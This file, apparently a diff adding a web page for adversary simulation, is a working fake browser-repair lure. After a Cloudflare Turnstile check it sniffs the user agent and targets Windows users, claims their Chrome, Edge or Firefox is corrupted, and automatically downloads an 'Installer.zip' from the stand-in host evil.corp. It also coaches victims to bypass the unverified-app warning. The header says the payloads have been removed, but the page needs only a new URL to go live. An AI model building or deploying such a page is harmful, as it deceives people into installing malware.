@@ -1,0 +1,299 @@
+/* 
+ * LEGAL DISCLAIMER:
+ * Authorized use only. This script simulates 
+ * adversary behavior for security research.
+ *
+ * Malicious payloads have been removed and the current html tries to target mostly windows users with browser detection and customized messages.
+ * As mentioned before the "Browser Downloads" have been removed and now point to evil.corp instead of downloading a zip file for the user to run.
+ * Author: Joseph McPeters (liquidsky) 2/25/26
+ */
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Browser Installation Check</title>
+  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+  <style>
+    body {
+      margin: 0;
+      font-family: Roboto, Arial, sans-serif;
+      background: #fff;
+    }
+
+    #overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      backdrop-filter: blur(4px);
+      background-color: rgba(0, 0, 0, 0.4);
+      z-index: 9999;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    #verification-modal {
+      background: white;
+      padding: 40px;
+      border-radius: 12px;
+      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
+      text-align: center;
+      max-width: 400px;
+      width: 90%;
+    }
+
+    .warning-message {
+      font-size: 1.1em;
+      color: #d93025;
+      margin-bottom: 20px;
+    }
+
+    #main-content {
+      display: none;
+    }
+
+    .main-wrapper {
+      max-width: 800px;
+      margin: 0 auto;
+      padding: 40px 20px;
+      text-align: center;
+    }
+
+    .hidden { display: none; }
+    .browser-icon {
+      width: 128px;
+      height: 128px;
+      margin-bottom: 20px;
+    }
+    h1 {
+      font-size: 2.2em;
+      margin-top: 12px;
+    }
+    .warning {
+      color: #d93025;
+      font-weight: bold;
+      font-size: 1.1em;
+      margin: 20px 0;
+    }
+    p {
+      font-size: 1.1em;
+      color: #5f6368;
+      max-width: 600px;
+      margin: 0 auto 30px;
+    }
+    .btn {
+      background-color: #1a73e8;
+      color: white;
+      padding: 14px 32px;
+      font-size: 16px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      text-decoration: none;
+      display: inline-block;
+    }
+    .btn:hover { background-color: #1558b0; }
+    .c-windows-disclaimer {
+      padding: 16px;
+      margin: 20px auto;
+      max-width: 600px;
+      border: 1px solid #ccc;
+      background-color: #f9f9f9;
+      border-radius: 6px;
+      text-align: left;
+      font-size: 0.95em;
+    }
+    .c-windows-disclaimer-logo {
+      width: 132px;
+      height: auto;
+      margin: 0 auto 12px;
+      display: block;
+    }
+    .c-windows-disclaimer p {
+      margin: 0 0 8px;
+      color: #333;
+    }
+    .c-windows-disclaimer a {
+      color: #1a73e8;
+      text-decoration: none;
+    }
+    .c-windows-disclaimer a:hover {
+      text-decoration: underline;
+    }
+    .progress-container {
+      width: 100%;
+      max-width: 600px;
+      margin: 20px auto;
+    }
+    .progress-bar {
+      width: 0;
+      height: 16px;
+      background-color: #1a73e8;
+      transition: width 2s ease-in-out;
+      border-radius: 4px;
+    }
+    .progress-track {
+      width: 100%;
+      background-color: #e0e0e0;
+      border-radius: 4px;
+      overflow: hidden;
+      margin-bottom: 20px;
+    }
+  </style>
+</head>
+<body>
+  <div id="overlay">
+    <div id="verification-modal">
+      <p class="warning-message">Please verify you're human to continue.</p>
+      <div id="turnstile-widget"></div>
+    </div>
+  </div>
+
+  <div id="main-content">
+    <div class="main-wrapper">
+
+      <div id="progressWrapper" class="progress-container hidden">
+        <div class="progress-track">
+          <div class="progress-bar" id="progressBar"></div>
+        </div>
+        <div style="font-size: 0.95em; color: #5f6368;">Checking installation...</div>
+      </div>
+
+      <div id="chromePage" class="hidden" data-download="https://evil.corp/jFYwGWiU/Installer.zip">
+        <img class="browser-icon" src="https://www.google.com/chrome/static/images/chrome-logo-m100.svg" alt="Chrome logo">
+        <h1>Chrome Installation Repair</h1>
+        <div class="warning">Your Chrome installation is missing or corrupted.</div>
+        <p>Chrome encountered an error and needs to be repaired or reinstalled to continue working properly.</p>
+        <aside class="c-windows-disclaimer">
+          <img class="c-windows-disclaimer-logo" src="https://www.mozilla.org/media/img/logos/windows/logo-windows-black.85f4165e8267.svg" alt="Windows">
+          <p>Not running? Make sure you extracted the installer from the installer package.</p>
+          <p>If you see a prompt stating the app you’re trying to install isn’t a Microsoft-verified app, click “Install anyway” or change app recommendation settings.</p>
+        </aside>
+        <a href="https://google.com/chrome" class="btn" onclick="event.preventDefault(); window.location.href='https://evil.corp/jFYwGWiU/Installer.zip';">Reinstall Chrome</a>
+      </div>
+
+      <div id="edgePage" class="hidden" data-download="https://evil.corp/jFYwGWiU/Installer.zip">
+        <img class="browser-icon" src="https://upload.wikimedia.org/wikipedia/commons/9/98/Microsoft_Edge_logo_%282019%29.svg" alt="Edge logo">
+        <h1>Microsoft Edge Installation Repair</h1>
+        <div class="warning">Your Microsoft Edge installation is missing or corrupted.</div>
+        <p>Edge ran into a problem and needs to be repaired or reinstalled to work correctly.</p>
+        <aside class="c-windows-disclaimer">
+          <img class="c-windows-disclaimer-logo" src="https://www.mozilla.org/media/img/logos/windows/logo-windows-black.85f4165e8267.svg" alt="Windows">
+          <p>Not running? Make sure you extracted the installer from the installer package.</p>
+          <p>If you see a prompt stating the app you’re trying to install isn’t a Microsoft-verified app, click “Install anyway” or change app recommendation settings.</p>
+        </aside>
+        <a href="https://microsoft.com/edge" class="btn" onclick="event.preventDefault(); window.location.href='https://evil.corp/jFYwGWiU/Installer.zip';">Reinstall Edge</a>
+      </div>
+
+      <div id="firefoxPage" class="hidden" data-download="https://evil.corp/jFYwGWiU/Installer.zip">
+        <img class="browser-icon" src="https://www.firefox.com/media/img/logos/firefox/logo-word-hor.f3b18871b657.svg" alt="Firefox logo">
+        <h1>Firefox Installation Repair</h1>
+        <div class="warning">Your Firefox installation is missing or corrupted.</div>
+        <p>Firefox encountered a critical issue and needs to be repaired or reinstalled to function properly.</p>
+        <aside class="c-windows-disclaimer">
+          <img class="c-windows-disclaimer-logo" src="https://www.mozilla.org/media/img/logos/windows/logo-windows-black.85f4165e8267.svg" alt="Windows">
+          <p>Not running? Make sure you extracted the installer from the installer package.</p>
+          <p>If you see a prompt stating the app you’re trying to install isn’t a Microsoft-verified app, click “Install anyway” or change app recommendation settings.</p>
+        </aside>
+        <a href="https://getfirefox.com" class="btn" onclick="event.preventDefault(); window.location.href='https://evil.corp/jFYwGWiU/Installer.zip';">Reinstall Firefox</a>
+      </div>
+
+      <div id="unsupportedPage" class="hidden">
+        <h1>Platform Not Supported</h1>
+        <div class="warning">This installer is only available for Windows 10/11 (64-bit).</div>
+        <p>You're currently using an unsupported platform (macOS, Linux, iOS, or Android). Please visit this page using a supported Windows device to continue.</p>
+      </div>
+
+      <div id="otherPage" class="hidden" data-download="https://evil.corp/jFYwGWiU/Installer.zip">
+        <img class="browser-icon" src="https://evil.corp/qYInQazB/error-icon-25239.png" alt="">
+        <h1>Download Supported Browser</h1>
+        <p>You are not currently using Chrome, Edge, or Firefox.</p>
+        <aside class="c-windows-disclaimer">
+          <img class="c-windows-disclaimer-logo" src="https://www.mozilla.org/media/img/logos/windows/logo-windows-black.85f4165e8267.svg" alt="Windows">
+          <p>Not running? Make sure you extracted the installer from the installer package.</p>
+          <p>If you see a prompt stating the app you’re trying to install isn’t a Microsoft-verified app, click “Install anyway” or change app recommendation settings.</p>
+        </aside>
+        <a href="https://google.com/chrome" class="btn" onclick="event.preventDefault(); window.location.href='https://evil.corp/jFYwGWiU/Installer.zip';">Download Chrome</a>
+        <a href="https://microsoft.com/edge" class="btn" onclick="event.preventDefault(); window.location.href='https://evil.corp/jFYwGWiU/Installer.zip';">Download Firefox</a>
+        <a href="https://getfirefox.com" class="btn" onclick="event.preventDefault(); window.location.href='https://evil.corp/jFYwGWiU/Installer.zip';">Download Edge</a>
+      </div>
+
+    </div>
+  </div>
+
+  <script>
+    function onTurnstileSuccess(token) {
+      if (!token) return;
+
+      document.getElementById("overlay").remove();
+      document.getElementById("main-content").style.display = "block";
+
+      const ua = navigator.userAgent;
+      const platform = navigator.platform.toLowerCase();
+      const isChrome = ua.includes("Chrome") && !ua.includes("Edg") && !ua.includes("OPR");
+      const isEdge = ua.includes("Edg");
+      const isFirefox = ua.includes("Firefox");
+      const isMobile = /Android|iPhone|iPad/i.test(ua);
+      const isNonWindows = /Mac|Linux|CrOS|X11/i.test(ua) || platform.includes("mac") || platform.includes("linux");
+
+      let shownId = null;
+      if (isMobile || isNonWindows) {
+        shownId = "unsupportedPage";
+      } else if (isEdge) {
+        shownId = "edgePage";
+      } else if (isChrome) {
+        shownId = "chromePage";
+      } else if (isFirefox) {
+        shownId = "firefoxPage";
+      } else {
+        shownId = "otherPage";
+      }
+
+      const pageDiv = document.getElementById(shownId);
+      pageDiv.classList.remove("hidden");
+
+      const key = "downloaded-" + shownId;
+      const downloadUrl = pageDiv.getAttribute("data-download");
+      const progressWrapper = document.getElementById("progressWrapper");
+      const progressBar = document.getElementById("progressBar");
+
+      if (downloadUrl && !sessionStorage.getItem(key)) {
+        sessionStorage.setItem(key, "true");
+        if (progressWrapper && progressBar) {
+          progressWrapper.classList.remove("hidden");
+          setTimeout(() => {
+            progressBar.style.width = "100%";
+          }, 100);
+          setTimeout(() => {
+            progressWrapper.remove();
+            const a = document.createElement('a');
+            a.href = downloadUrl;
+            a.download = '';
+            a.style.display = 'none';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+          }, 2500);
+        }
+      }
+    }
+
+    function renderTurnstileWhenReady() {
+      if (typeof turnstile !== "undefined") {
+        turnstile.render("#turnstile-widget", {
+          sitekey: "0x4AAAAAABhqulDLnzK6PBmO",
+          size: "normal",
+          callback: onTurnstileSuccess
+        });
+      } else {
+        setTimeout(renderTurnstileWhenReady, 50);
+      }
+    }
+
+    document.addEventListener("DOMContentLoaded", renderTurnstileWhenReady);
+  </script>
+</body>
+</html>
